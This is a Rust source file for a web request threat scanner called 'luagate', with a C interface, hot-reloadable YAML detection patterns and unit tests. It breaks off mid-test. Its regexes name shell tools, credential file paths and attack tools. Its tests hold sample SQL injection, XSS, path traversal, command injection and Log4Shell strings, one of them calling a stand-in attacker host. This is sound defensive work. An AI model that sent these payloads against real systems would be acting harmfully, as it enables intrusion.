use once_cell::sync::Lazy;
use regex::Regex;
use serde::Deserialize;
use sha2::{Digest, Sha256};
use std::collections::HashSet;
use std::fs;
use std::path::Path;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::RwLock;
#[cfg(test)]
use std::sync::atomic::AtomicU64;
use std::time::{Duration, Instant};

// Return codes (ABI contract — docs/spec/rust-ffi-modules.md §4)
const LUAGATE_OK: i32 = 0;
const LUAGATE_BUFFER_TOO_SMALL: i32 = -2;
const LUAGATE_BUDGET_EXCEEDED: i32 = -3;
const LUAGATE_INTERNAL_ERROR: i32 = -4;

// Per-request budget: 5 ms
const BUDGET_NS: u128 = 5_000_000;

// Reload budget: 100 ms (ADR-014 §7)
const RELOAD_BUDGET_NS: u128 = 100_000_000;

// Test-only budget override.  When non-zero, budget_exceeded uses this value
// instead of BUDGET_NS so that timing-sensitive tests can run without flaking.
#[cfg(test)]
static TEST_BUDGET_NS_OVERRIDE: AtomicU64 = AtomicU64::new(0);

// Input size limits: 8 KB per field
const MAX_FIELD_LEN: usize = 8 * 1024;

// Maximum pattern file size: 1 MB (ADR-014 risk mitigation)
const MAX_PATTERN_FILE_SIZE: u64 = 1_048_576;

struct ThreatPattern {
    threat_type: String,
    rule_name: String,
    pattern: Regex,
    score: f64,
}

struct Scanner {
    patterns: Vec<ThreatPattern>,
}

// Global scanner instance — RwLock per ADR-014 §2.
// luagate_scan_http() uses try_read() for contention-free access in normal state.
// luagate_scanner_init() and luagate_scanner_reload() use write() for exclusive access.
static SCANNER: Lazy<RwLock<Option<Scanner>>> = Lazy::new(|| RwLock::new(None));

// ADR-014 §7: Per-worker flag set when reload timeout occurs.
// When true, all luagate_scan_http() calls return INTERNAL_ERROR.
// Reset to false only on next successful reload.
static SCANNER_RELOAD_FAILED: AtomicBool = AtomicBool::new(false);

// ---------------------------------------------------------------------------
// YAML schema for pattern files (ADR-014 §8)
// ---------------------------------------------------------------------------

#[derive(Deserialize)]
struct PatternFile {
    patterns: Vec<PatternEntry>,
}

#[derive(Deserialize)]
struct PatternEntry {
    threat_type: String,
    rule_name: String,
    pattern: String,
    score: f64,
}

// ---------------------------------------------------------------------------
// Default (hardcoded) patterns — used when init is not called with a valid
// patterns directory or YAML loading fails.
// ---------------------------------------------------------------------------

fn build_default_scanner() -> Scanner {
    let raw_patterns: &[(&str, &str, &str, f64)] = &[
        // sqli
        (
            "sqli",
            "sqli_union_select",
            r"(?i)(union\s+(all\s+)?select)",
            0.9,
        ),
        (
            "sqli",
            "sqli_or_always_true",
            r"(?i)(or\s+1\s*=\s*1|and\s+1\s*=\s*1)",
            0.8,
        ),
        (
            "sqli",
            "sqli_drop_table",
            r"(?i)(;\s*(drop|delete|insert|update)\s+)",
            0.95,
        ),
        ("sqli", "sqli_exec", r"(?i)(exec\s*\(|execute\s*\()", 0.9),
        (
            "sqli",
            "sqli_schema_leak",
            r"(?i)(information_schema|@@version|@@datadir)",
            0.85,
        ),
        // xss
        ("xss", "xss_script_tag", r"(?i)<\s*script[^>]*>", 0.9),
        ("xss", "xss_javascript_uri", r"(?i)javascript\s*:", 0.85),
        ("xss", "xss_event_handler", r"(?i)\bon\w+\s*=", 0.8),
        (
            "xss",
            "xss_img_onerror",
            r"(?i)<\s*img[^>]+onerror\s*=",
            0.9,
        ),
        (
            "xss",
            "xss_dom_sink",
            r"(?i)(document\.cookie|document\.write|eval\s*\()",
            0.85,
        ),
        // path_traversal
        (
            "path_traversal",
            "path_traversal_dotdot",
            r"(\.\.[\\/])",
            0.9,
        ),
        (
            "path_traversal",
            "path_traversal_encoded",
            r"(?i)(%2e%2e[%2f%5c])",
            0.9,
        ),
        (
            "path_traversal",
            "path_traversal_unix",
            r"(?i)(/etc/passwd|/etc/shadow|/proc/self)",
            0.95,
        ),
        (
            "path_traversal",
            "path_traversal_windows",
            r"(?i)(c:\\windows\\)",
            0.9,
        ),
        // cmd_injection
        (
            "cmd_injection",
            "cmd_injection_shell_cmd",
            r"[;&|`]\s*(ls|cat|id|whoami|uname|wget|curl|chmod|bash|sh)\b",
            0.9,
        ),
        (
            "cmd_injection",
            "cmd_injection_subshell",
            r"(?i)\$\(.*\)",
            0.85,
        ),
        ("cmd_injection", "cmd_injection_backtick", r"`[^`]+`", 0.8),
        // ssrf
        (
            "ssrf",
            "ssrf_internal_host",
            r"(?i)(https?://(localhost|127\.0\.0\.1|0\.0\.0\.0|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.))",
            0.9,
        ),
        (
            "ssrf",
            "ssrf_dangerous_scheme",
            r"(?i)(file://|gopher://|dict://)",
            0.9,
        ),
        // xxe
        ("xxe", "xxe_entity_decl", r"(?i)(<!entity\s)", 0.9),
        (
            "xxe",
            "xxe_doctype_system",
            r"(?i)(<!doctype[^>]+system\s)",
            0.85,
        ),
        // log4shell
        ("log4shell", "log4shell_jndi", r"(?i)\$\{jndi\s*:", 1.0),
        ("log4shell", "log4shell_nested", r"(?i)\$\{.*:.*\{", 0.8),
        // scanner (automated scanner detection)
        (
            "scanner",
            "scanner_tool",
            r"(?i)(sqlmap|nikto|nessus|openvas|masscan|nmap|dirbuster|gobuster|wfuzz|hydra)",
            0.9,
        ),
    ];

    let patterns = raw_patterns
        .iter()
        .filter_map(|(threat_type, rule_name, pat, score)| {
            Regex::new(pat).ok().map(|r| ThreatPattern {
                threat_type: threat_type.to_string(),
                rule_name: rule_name.to_string(),
                pattern: r,
                score: *score,
            })
        })
        .collect();

    Scanner { patterns }
}

fn budget_exceeded(elapsed: Duration) -> bool {
    #[cfg(test)]
    {
        let override_ns = TEST_BUDGET_NS_OVERRIDE.load(Ordering::Relaxed);
        if override_ns > 0 {
            return elapsed.as_nanos() > override_ns as u128;
        }
    }
    elapsed.as_nanos() > BUDGET_NS
}

// ---------------------------------------------------------------------------
// YAML pattern loader (ADR-014 §3: Read → Parse → Compile)
// ---------------------------------------------------------------------------

/// Load patterns from YAML files in a directory.
/// Returns (Scanner, pattern_count, sha256_hex) on success.
/// Returns Err(message) on any failure (Read/Parse/Compile).
fn load_patterns_from_dir(dir_path: &str) -> Result<(Scanner, usize, String), String> {
    let start = Instant::now();
    let dir = Path::new(dir_path);

    if !dir.is_dir() {
        return Err(format!("patterns directory does not exist: {}", dir_path));
    }

    // [1] Read: collect all .yaml files, sorted by filename (ADR-014 §4)
    let mut yaml_files: Vec<_> = fs::read_dir(dir)
        .map_err(|e| format!("cannot read patterns directory: {}", e))?
        .filter_map(|entry| entry.ok())
        .filter(|entry| {
            entry
                .path()
                .extension()
                .is_some_and(|ext| ext == "yaml" || ext == "yml")
        })
        .collect();
    yaml_files.sort_by_key(|e| e.file_name());

    if yaml_files.is_empty() {
        return Err("no .yaml files found in patterns directory".to_string());
    }

    // SHA256 hasher: concatenate all file contents in sorted order (ADR-014 §4)
    let mut hasher = Sha256::new();
    let mut all_entries: Vec<PatternEntry> = Vec::new();

    for entry in &yaml_files {
        let path = entry.path();

        // File size check (ADR-014 risk: YAML parsing memory explosion)
        let metadata = fs::metadata(&path)
            .map_err(|e| format!("cannot stat {}: {}", path.display(), e))?;
        if metadata.len() > MAX_PATTERN_FILE_SIZE {
            return Err(format!(
                "pattern file {} exceeds 1MB limit ({})",
                path.display(),
                metadata.len()
            ));
        }

        let content = fs::read(&path)
            .map_err(|e| format!("cannot read {}: {}", path.display(), e))?;

        // Feed into SHA256
        hasher.update(&content);

        // [2] Parse
        let pf: PatternFile = serde_yaml::from_slice(&content)
            .map_err(|e| format!("YAML parse error in {}: {}", path.display(), e))?;

        all_entries.extend(pf.patterns);
    }

    // Validation: duplicate rule_name check (ADR-014 §8)
    let mut seen_names = HashSet::new();
    for entry in &all_entries {
        if !seen_names.insert(&entry.rule_name) {
            return Err(format!("duplicate rule_name: {}", entry.rule_name));
        }
        // rule_name format: [a-z0-9_]+, max 64 chars
        if entry.rule_name.len() > 64 {
            return Err(format!(
                "rule_name '{}' exceeds 64 char limit",
                entry.rule_name
            ));
        }
        if !entry
            .rule_name
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '_')
        {
            return Err(format!(
                "rule_name '{}' contains invalid characters (must be [a-z0-9_]+)",
                entry.rule_name
            ));
        }
        // score range check
        if !(0.0..=1.0).contains(&entry.score) {
            return Err(format!(
                "rule '{}': score {} out of range [0.0, 1.0]",
                entry.rule_name, entry.score
            ));
        }
    }

    // Budget check before compile
    if start.elapsed().as_nanos() > RELOAD_BUDGET_NS {
        return Err("reload budget exceeded during read/parse".to_string());
    }

    // [3] Compile: regex compilation. 1 failure = entire reload aborted.
    let mut patterns = Vec::with_capacity(all_entries.len());
    for entry in all_entries {
        let regex = Regex::new(&entry.pattern)
            .map_err(|e| format!("regex compile failed for '{}': {}", entry.rule_name, e))?;

        patterns.push(ThreatPattern {
            threat_type: entry.threat_type,
            rule_name: entry.rule_name,
            pattern: regex,
            score: entry.score,
        });

        // Budget check per pattern
        if start.elapsed().as_nanos() > RELOAD_BUDGET_NS {
            return Err("reload budget exceeded during regex compilation".to_string());
        }
    }

    let pattern_count = patterns.len();
    let sha256_hex = format!("{:x}", hasher.finalize());

    Ok((Scanner { patterns }, pattern_count, sha256_hex))
}

// ---------------------------------------------------------------------------
// Public C API
// ---------------------------------------------------------------------------

/// Initialise the scanner.  Called once from `init_by_lua`.
///
/// `patterns_path` may be empty ("") to use hardcoded defaults.
/// When a valid directory path is provided, loads YAML patterns from that
/// directory.  Falls back to hardcoded defaults on YAML load failure.
///
/// Returns LUAGATE_OK (0) on success, LUAGATE_INTERNAL_ERROR (-4) on failure.
///
/// # Safety
/// `patterns_path` must be a valid pointer to `patterns_path_len` bytes, or
/// NULL when `patterns_path_len` == 0.
#[no_mangle]
pub extern "C" fn luagate_scanner_init(patterns_path: *const i8, patterns_path_len: usize) -> i32 {
    let scanner = if !patterns_path.is_null() && patterns_path_len > 0 {
        let bytes =
            unsafe { std::slice::from_raw_parts(patterns_path as *const u8, patterns_path_len) };
        let path_str = match std::str::from_utf8(bytes) {
            Ok(s) => s,
            Err(_) => return LUAGATE_INTERNAL_ERROR,
        };

        // Attempt YAML loading; fall back to hardcoded on failure
        match load_patterns_from_dir(path_str) {
            Ok((scanner, count, _sha)) => {
                eprintln!(
                    "[luagate_scanner] loaded {} patterns from '{}'",
                    count, path_str
                );
                scanner
            }
            Err(e) => {
                eprintln!(
                    "[luagate_scanner] WARNING: YAML load from '{}' failed ({}). Using hardcoded patterns.",
                    path_str, e
                );
                build_default_scanner()
            }
        }
    } else {
        build_default_scanner()
    };

    match SCANNER.write() {
        Ok(mut guard) => {
            *guard = Some(scanner);
            LUAGATE_OK
        }
        Err(_) => LUAGATE_INTERNAL_ERROR,
    }
}

/// Runtime pattern reload (ADR-014 §1).
///
/// 5-stage pipeline: Read → Parse → Compile → Swap → Verify
/// On failure, LKG is preserved and LUAGATE_INTERNAL_ERROR is returned.
///
/// `patterns_path` must point to the scanner-patterns directory.
///
/// On success, writes the SHA256 hex (64 bytes + NUL) into `version_out`
/// if `version_out` is not NULL and `version_out_cap` >= 65.
///
/// Returns:
///   LUAGATE_OK (0) on success
///   LUAGATE_INTERNAL_ERROR (-4) on failure (LKG preserved)
///
/// # Safety
/// `patterns_path` must be a valid pointer to `patterns_path_len` bytes.
/// `version_out` may be NULL.
#[no_mangle]
#[allow(clippy::not_unsafe_ptr_arg_deref)]
pub extern "C" fn luagate_scanner_reload(
    patterns_path: *const i8,
    patterns_path_len: usize,
    version_out: *mut i8,
    version_out_cap: usize,
    pattern_count_out: *mut usize,
) -> i32 {
    // Check SCANNER_RELOAD_FAILED flag — if a previous reload timed out,
    // we still allow new reload attempts to recover.

    if patterns_path.is_null() || patterns_path_len == 0 {
        return LUAGATE_INTERNAL_ERROR;
    }

    let bytes =
        unsafe { std::slice::from_raw_parts(patterns_path as *const u8, patterns_path_len) };
    let path_str = match std::str::from_utf8(bytes) {
        Ok(s) => s,
        Err(_) => return LUAGATE_INTERNAL_ERROR,
    };

    // [1-3] Read → Parse → Compile (outside write lock)
    let (new_scanner, count, sha256_hex) = match load_patterns_from_dir(path_str) {
        Ok(result) => result,
        Err(e) => {
            eprintln!("[luagate_scanner] reload failed: {}", e);
            return LUAGATE_INTERNAL_ERROR;
        }
    };

    // [4] Swap: acquire write lock and replace scanner
    match SCANNER.write() {
        Ok(mut guard) => {
            *guard = Some(new_scanner);
        }
        Err(_) => {
            eprintln!("[luagate_scanner] reload failed: write lock poisoned");
            return LUAGATE_INTERNAL_ERROR;
        }
    }

    // Successful reload: clear SCANNER_RELOAD_FAILED flag (ADR-014 §7)
    SCANNER_RELOAD_FAILED.store(false, Ordering::Release);

    // [5] Verify: write version and pattern count to output buffers
    if !version_out.is_null() && version_out_cap >= 65 {
        let sha_bytes = sha256_hex.as_bytes();
        let copy_len = sha_bytes.len().min(version_out_cap - 1);
        unsafe {
            std::ptr::copy_nonoverlapping(
                sha_bytes.as_ptr() as *const i8,
                version_out,
                copy_len,
            );
            *version_out.add(copy_len) = 0; // NUL terminator
        }
    }

    if !pattern_count_out.is_null() {
        unsafe {
            *pattern_count_out = count;
        }
    }

    eprintln!(
        "[luagate_scanner] reload success: {} patterns, version={}",
        count,
        &sha256_hex[..8]
    );

    LUAGATE_OK
}

/// Scan an HTTP request for threats.
///
/// All string arguments must remain valid for the duration of the call.
/// `body` may be NULL when `body_len` == 0 (MVP: body scanning skipped).
///
/// On success returns LUAGATE_OK.  When a threat is detected
/// `threat_type_len > 0` and the caller-allocated buffers are populated.
///
/// Returns LUAGATE_BUDGET_EXCEEDED (-3) when the 5 ms budget is exceeded, or
/// LUAGATE_INTERNAL_ERROR (-4) on any other error.
///
/// # Safety
/// All non-NULL pointer arguments must be valid for the stated length.
#[no_mangle]
#[allow(clippy::too_many_arguments)]
#[allow(clippy::not_unsafe_ptr_arg_deref)]
pub extern "C" fn luagate_scan_http(
    path_raw: *const i8,
    path_raw_len: usize,
    path_normalized: *const i8,
    path_normalized_len: usize,
    query_raw: *const i8,
    query_raw_len: usize,
    query_normalized: *const i8,
    query_normalized_len: usize,
    body: *const i8,
    body_len: usize,
    threat_type_out: *mut i8,
    threat_type_cap: usize,
    threat_type_len: *mut usize,
    rule_name_out: *mut i8,
    rule_name_cap: usize,
    rule_name_len: *mut usize,
    score_out: *mut f64,
) -> i32 {
    let start = Instant::now();

    // ADR-014 §7: Check SCANNER_RELOAD_FAILED flag first
    if SCANNER_RELOAD_FAILED.load(Ordering::Acquire) {
        return LUAGATE_INTERNAL_ERROR;
    }

    // Validate output pointer requirements.
    if threat_type_out.is_null()
        || threat_type_len.is_null()
        || rule_name_out.is_null()
        || rule_name_len.is_null()
        || score_out.is_null()
    {
        return LUAGATE_INTERNAL_ERROR;
    }

    // Initialise outputs.
    unsafe {
        *threat_type_len = 0;
        *rule_name_len = 0;
        *score_out = 0.0_f64;
    }

    // Helper function: convert a C string pointer+length into a String,
    // applying the 8 KB size limit.  Returns None on size violation.
    // Uses from_utf8_lossy for non-UTF8 input so invalid bytes do not allow
    // scan bypass (decode_partial contract from security-scanner.md).
    fn to_str_lossy(ptr: *const i8, len: usize) -> Option<(String, bool)> {
        if ptr.is_null() || len == 0 {
            return Some((String::new(), false));
        }
        if len > MAX_FIELD_LEN {
            return None; // size violation → INTERNAL_ERROR
        }
        let bytes = unsafe { std::slice::from_raw_parts(ptr as *const u8, len) };
        match std::str::from_utf8(bytes) {
            Ok(s) => Some((s.to_string(), false)),
            Err(_) => {
                // Invalid UTF-8 — lossy conversion; scan continues with
                // replacement characters so attack bytes are not silently skipped.
                eprintln!("[luagate_scanner] WARNING: invalid UTF-8 input, using lossy conversion");
                Some((String::from_utf8_lossy(bytes).into_owned(), true))
            }
        }
    }

    macro_rules! field_str {
        ($ptr:expr, $len:expr) => {
            match to_str_lossy($ptr, $len) {
                Some((s, _had_lossy)) => s,
                None => return LUAGATE_INTERNAL_ERROR,
            }
        };
    }

    let s_path_raw = field_str!(path_raw, path_raw_len);
    let s_path_norm = field_str!(path_normalized, path_normalized_len);
    let s_query_raw = field_str!(query_raw, query_raw_len);
    let s_query_norm = field_str!(query_normalized, query_normalized_len);

    // MVP: body scanning is skipped when body_len == 0.
    let _ = (body, body_len);

    // Acquire the scanner via RwLock try_read() (ADR-014 §2).
    // try_read() returns immediately — during reload (write lock held),
    // it fails and we return INTERNAL_ERROR (fail-closed).
    let guard = match SCANNER.try_read() {
        Ok(g) => g,
        Err(_) => return LUAGATE_INTERNAL_ERROR,
    };

    let scanner = match guard.as_ref() {
        Some(s) => s,
        // Scanner not initialised — fail-closed per ADR-001.
        None => return LUAGATE_INTERNAL_ERROR,
    };

    // Fields to scan in evaluation order (spec §4.2):
    //   path_raw, path_normalized, query_raw, query_normalized
    let fields = [&s_path_raw, &s_path_norm, &s_query_raw, &s_query_norm];

    for pattern in &scanner.patterns {
        // Budget check per pattern.
        if budget_exceeded(start.elapsed()) {
            return LUAGATE_BUDGET_EXCEEDED;
        }

        for field in &fields {
            if field.is_empty() {
                continue;
            }
            if pattern.pattern.is_match(field) {
                let tt = pattern.threat_type.as_bytes();
                let rn = pattern.rule_name.as_bytes();

                // Threat detected — reject undersized caller buffers instead of
                // silently truncating (fail-closed: caller must not treat a
                // partial threat_type as "no threat").
                if threat_type_cap < tt.len() {
                    return LUAGATE_BUFFER_TOO_SMALL;
                }
                if rule_name_cap < rn.len() {
                    return LUAGATE_BUFFER_TOO_SMALL;
                }

                // Write threat_type into caller buffer.
                unsafe {
                    std::ptr::copy_nonoverlapping(
                        tt.as_ptr() as *const i8,
                        threat_type_out,
                        tt.len(),
                    );
                    *threat_type_len = tt.len();
                }

                // Write rule_name into caller buffer.
                unsafe {
                    std::ptr::copy_nonoverlapping(
                        rn.as_ptr() as *const i8,
                        rule_name_out,
                        rn.len(),
                    );
                    *rule_name_len = rn.len();
                }

                unsafe {
                    *score_out = pattern.score;
                }

                return LUAGATE_OK;
            }
        }
    }

    // No threat detected.
    LUAGATE_OK
}

// ---------------------------------------------------------------------------
// Unit tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    fn init_scanner_for_test() {
        SCANNER_RELOAD_FAILED.store(false, Ordering::Release);
        let mut guard = SCANNER.write().unwrap();
        *guard = Some(build_default_scanner());
    }

    /// Scan helper that does NOT reset the scanner to defaults.
    /// Use when testing a scanner loaded from YAML.
    fn scan_without_reset(path_raw: &str, query_raw: &str) -> (i32, String, String, f64) {
        SCANNER_RELOAD_FAILED.store(false, Ordering::Release);

        let mut threat_buf = vec![0i8; 64];
        let mut rule_buf = vec![0i8; 128];
        let mut threat_len: usize = 0;
        let mut rule_len: usize = 0;
        let mut score: f64 = 0.0;

        let rc = luagate_scan_http(
            path_raw.as_ptr() as *const i8,
            path_raw.len(),
            path_raw.as_ptr() as *const i8,
            path_raw.len(),
            query_raw.as_ptr() as *const i8,
            query_raw.len(),
            query_raw.as_ptr() as *const i8,
            query_raw.len(),
            std::ptr::null(),
            0,
            threat_buf.as_mut_ptr(),
            64,
            &mut threat_len,
            rule_buf.as_mut_ptr(),
            128,
            &mut rule_len,
            &mut score,
        );

        let threat = if threat_len > 0 {
            let bytes: Vec<u8> = threat_buf[..threat_len].iter().map(|&b| b as u8).collect();
            String::from_utf8_lossy(&bytes).to_string()
        } else {
            String::new()
        };

        let rule = if rule_len > 0 {
            let bytes: Vec<u8> = rule_buf[..rule_len].iter().map(|&b| b as u8).collect();
            String::from_utf8_lossy(&bytes).to_string()
        } else {
            String::new()
        };

        (rc, threat, rule, score)
    }

    fn make_scan_call(path_raw: &str, query_raw: &str) -> (i32, String, String, f64) {
        // Ensure scanner is initialised for unit tests.
        init_scanner_for_test();

        let mut threat_buf = vec![0i8; 64];
        let mut rule_buf = vec![0i8; 128];
        let mut threat_len: usize = 0;
        let mut rule_len: usize = 0;
        let mut score: f64 = 0.0;

        let rc = luagate_scan_http(
            path_raw.as_ptr() as *const i8,
            path_raw.len(),
            path_raw.as_ptr() as *const i8,
            path_raw.len(),
            query_raw.as_ptr() as *const i8,
            query_raw.len(),
            query_raw.as_ptr() as *const i8,
            query_raw.len(),
            std::ptr::null(),
            0,
            threat_buf.as_mut_ptr(),
            64,
            &mut threat_len,
            rule_buf.as_mut_ptr(),
            128,
            &mut rule_len,
            &mut score,
        );

        let threat = if threat_len > 0 {
            let bytes: Vec<u8> = threat_buf[..threat_len].iter().map(|&b| b as u8).collect();
            String::from_utf8_lossy(&bytes).to_string()
        } else {
            String::new()
        };

        let rule = if rule_len > 0 {
            let bytes: Vec<u8> = rule_buf[..rule_len].iter().map(|&b| b as u8).collect();
            String::from_utf8_lossy(&bytes).to_string()
        } else {
            String::new()
        };

        (rc, threat, rule, score)
    }

    #[test]
    fn test_clean_request_no_threat() {
        let (rc, threat, _, score) = make_scan_call("/api/users", "id=1");
        assert_eq!(rc, 0);
        assert!(threat.is_empty());
        assert_eq!(score, 0.0);
    }

    #[test]
    fn test_budget_threshold_is_strictly_greater_than_five_ms() {
        assert!(!budget_exceeded(Duration::from_millis(5)));
        assert!(budget_exceeded(Duration::from_nanos(5_000_001)));
    }

    #[test]
    fn test_sqli_detection() {
        let (rc, threat, rule, score) =
            make_scan_call("/api/users", "id=1 UNION SELECT * FROM users");
        assert_eq!(rc, 0);
        assert_eq!(threat, "sqli");
        assert!(!rule.is_empty());
        assert!(score >= 0.8);
    }

    #[test]
    fn test_xss_detection() {
        let (rc, threat, _, _) = make_scan_call("/page", "q=<script>alert(1)</script>");
        assert_eq!(rc, 0);
        assert_eq!(threat, "xss");
    }

    #[test]
    fn test_path_traversal_detection() {
        let (rc, threat, _, _) = make_scan_call("/../../etc/passwd", "");
        assert_eq!(rc, 0);
        assert_eq!(threat, "path_traversal");
    }

    #[test]
    fn test_log4shell_detection() {
        let (rc, threat, _, score) = make_scan_call("/", "x=${jndi:ldap://attacker.com/a}");
        assert_eq!(rc, 0);
        assert_eq!(threat, "log4shell");
        assert!(score >= 0.9);
    }

    #[test]
    fn test_null_output_pointers_return_internal_error() {
        init_scanner_for_test();
        let path = "/api/test";
        let query = "id=1";
        let mut threat_len: usize = 0;
        let mut rule_len: usize = 0;
        let mut score: f64 = 0.0;
        let mut threat_buf = vec![0i8; 64];
        let mut rule_buf = vec![0i8; 128];

        // NULL threat_type_out
        let rc = luagate_scan_http(
            path.as_ptr() as *const i8,
            path.len(),
            path.as_ptr() as *const i8,
            path.len(),
            query.as_ptr() as *const i8,
            query.len(),
            query.as_ptr() as *const i8,
            query.len(),
            std::ptr::null(),
            0,
            std::ptr::null_mut(), // NULL
            64,
            &mut threat_len,
            rule_buf.as_mut_ptr(),
            128,
            &mut rule_len,
            &mut score,
        );
        assert_eq!(rc, LUAGATE_INTERNAL_ERROR);

        // NULL rule_name_out
        let rc2 = luagate_scan_http(
            path.as_ptr() as *const i8,
            path.len(),
            path.as_ptr() as *const i8,
            path.len(),
            query.as_ptr() as *const i8,
            query.len(),
            query.as_ptr() as *const i8,
            query.len(),
            std::ptr::null(),
            0,
            threat_buf.as_mut_ptr(),
            64,
            &mut threat_len,
            std::ptr::null_mut(), // NULL
            128,
            &mut rule_len,
            &mut score,
        );
        assert_eq!(rc2, LUAGATE_INTERNAL_ERROR);
    }

    #[test]
    fn test_field_too_large_returns_internal_error() {
        init_scanner_for_test();

        let oversized = "A".repeat(MAX_FIELD_LEN + 1);
        let mut threat_buf = vec![0i8; 64];
        let mut rule_buf = vec![0i8; 128];
        let mut threat_len: usize = 0;
        let mut rule_len: usize = 0;
        let mut score: f64 = 0.0;

        let rc = luagate_scan_http(
            oversized.as_ptr() as *const i8,
            oversized.len(),
            oversized.as_ptr() as *const i8,
            oversized.len(),
            std::ptr::null(),
            0,
            std::ptr::null(),
            0,
            std::ptr::null(),
            0,
            threat_buf.as_mut_ptr(),
            64,
            &mut threat_len,
            rule_buf.as_mut_ptr(),
            128,
            &mut rule_len,
            &mut score,
        );
        assert_eq!(rc, LUAGATE_INTERNAL_ERROR);
    }

    #[test]
    fn test_cmd_injection_detection() {
        let (rc, threat, _, _) = make_scan_call("/api/run", "; cat /tmp/data");
        assert_eq!(rc, 0);
        assert_eq!(threat, "cmd_injection");
    }

    #[test]
    fn test_ssrf_detection() {
        let (rc, threat, _, _) = make_scan_call("/proxy", "url=http://127.0.0.1/admin");
        assert_eq!(rc, 0);
        assert_eq!(threat, "ssrf");
    }

    #[test]
    fn test_xxe_detection() {
        let (rc, threat, _, _) = make_scan_call("/upload", "data=<!entity foo system");
        assert_eq!(rc, 0);
        assert_eq!(threat, "xxe");
    }

    #[test]
    fn test_scanner_tool_detection() {
        let (rc, threat, _, _) = make_scan_call("/search", "ua=sqlmap/1.0");
        assert_eq!(rc, 0);
        assert_eq!(threat, "scanner");
    }

    #[test]
    fn test_threat_type_buffer_too_small_returns_buffer_too_small() {
        init_scanner_for_test();

        let path = "/page";
        let query = "q=<script>alert(1)</script>";
        let mut threat_buf = vec![0i8; 1]; // too small for "xss" (3 bytes)
        let mut rule_buf = vec![0i8; 128];
        let mut threat_len: usize = 0;
        let mut rule_len: usize = 0;
        let mut score: f64 = 0.0;

        let rc = luagate_scan_http(
            path.as_ptr() as *const i8,
            path.len(),
            path.as_ptr() as *const i8,
            path.len(),
            query.as_ptr() as *const i8,
            query.len(),
            query.as_ptr() as *const i8,
            query.len(),
            std::ptr::null(),
            0,
            threat_buf.as_mut_ptr(),
            1,
            &mut threat_len,
            rule_buf.as_mut_ptr(),
            128,
            &mut rule_len,
            &mut score,
        );
        assert_eq!(rc, LUAGATE_BUFFER_TOO_SMALL);
    }

    #[test]
    fn test_rule_name_buffer_too_small_returns_buffer_too_small() {
        init_scanner_for_test();

        let path = "/page";
        let query = "q=<script>alert(1)</script>";
        let mut threat_buf = vec![0i8; 64];
        let mut rule_buf = vec![0i8; 1]; // too small
        let mut threat_len: usize = 0;
        let mut rule_len: usize = 0;
        let mut score: f64 = 0.0;

        let rc = luagate_scan_http(
            path.as_ptr() as *const i8,
            path.len(),
            path.as_ptr() as *const i8,
            path.len(),
            query.as_ptr() as *const i8,
            query.len(),
            query.as_ptr() as *const i8,
            query.len(),
            std::ptr::null(),
            0,
            threat_buf.as_mut_ptr(),
            64,
            &mut threat_len,
            rule_buf.as_mut_ptr(),
            1,
            &mut rule_len,
            &mut score,
        );
        assert_eq!(rc, LUAGATE_BUFFER_TOO_SMALL);
    }

    #[test]
    fn test_init_with_patterns_path_loads_yaml() {
        // Create a temp directory with a valid YAML pattern file
        let dir = std::env::temp_dir().join("luagate_test_init_yaml");
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();

        let yaml_content = r#"patterns:
  - threat_type: "sqli"
    rule_name: "test_rule"
    pattern: "(?i)test_inject"
    score: 0.9
"#;
        fs::write(dir.join("test.yaml"), yaml_content).unwrap();

        let path = dir.to_str().unwrap();
        let rc = luagate_scanner_init(path.as_ptr() as *const i8, path.len());
        assert_eq!(rc, LUAGATE_OK);

        // Verify the loaded pattern detects (don't reset to defaults)
        let (rc, threat, rule, _) = scan_without_reset("/", "q=test_inject");
        assert_eq!(rc, 0);
        assert_eq!(threat, "sqli");
        assert_eq!(rule, "test_rule");

        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_non_utf8_input_uses_lossy_conversion_and_scans() {
        TEST_BUDGET_NS_OVERRIDE.store(500_000_000, Ordering::Relaxed);

        init_scanner_for_test();

        let mut query_bytes = vec![0xffu8];
        query_bytes.extend_from_slice(b"id=1 UNION SELECT * FROM users");

        let mut threat_buf = vec![0i8; 64];
        let mut rule_buf = vec![0i8; 128];
        let mut threat_len: usize = 0;
        let mut rule_len: usize = 0;
        let mut score: f64 = 0.0;

        let path = "/api/users";
        let rc = luagate_scan_http(
            path.as_ptr() as *const i8,
            path.len(),
            path.as_ptr() as *const i8,
            path.len(),
            query_bytes.as_ptr() as *const i8,
            query_bytes.len(),
            query_bytes.as_ptr() as *const i8,
            query_bytes.len(),
            std::ptr::null(),
            0,
            threat_buf.as_mut_ptr(),
            64,
            &mut threat_len,
            rule_buf.as_mut_ptr(),
            128,
            &mut rule_len,
            &mut score,
        );

        TEST_BUDGET_NS_OVERRIDE.store(0, Ordering::Relaxed);

        assert_eq!(rc, LUAGATE_OK);
        assert!(
            threat_len > 0,
            "threat should be detected even with invalid UTF-8 input"
        );
        let threat_bytes: Vec<u8> = threat_buf[..threat_len].iter().map(|&b| b as u8).collect();
        let threat = String::from_utf8_lossy(&threat_bytes).to_string();
        assert_eq!(threat, "sqli");
    }

    #[test]
    fn test_uninitialized_scanner_returns_internal_error() {
        let saved = {
            let mut guard = SCANNER.write().unwrap();
            guard.take()
        };

        let path = "/api/test";
        let query = "id=1";
        let mut threat_buf = vec![0i8; 64];
        let mut rule_buf = vec![0i8; 128];
        let mut threat_len: usize = 0;
        let mut rule_len: usize = 0;
        let mut score: f64 = 0.0;

        let rc = luagate_scan_http(
            path.as_ptr() as *const i8,
            path.len(),
            path.as_ptr() as *const i8,
            path.len(),
            query.as_ptr() as *const i8,
            query.len(),
            query.as_ptr() as *const i8,
            query.len(),
            std::ptr::null(),
            0,
            threat_buf.as_mut_ptr(),
            64,
            &mut threat_len,
            rule_buf.as_mut_ptr(),
            128,
            &mut rule_len,
            &mut score,
        );

        // Restore scanner state so other tests are not affected.
        {
            let mut guard = SCANNER.write().unwrap();
            *guard = saved;
        }

        assert_eq!(
            rc, LUAGATE_INTERNAL_ERROR,
            "uninitialized scanner must return INTERNAL_ERROR, not auto-init"
        );
    }

    #[test]
    fn test_reload_from_yaml_dir() {
        init_scanner_for_test();

        let dir = std::env::temp_dir().join("luagate_test_reload");
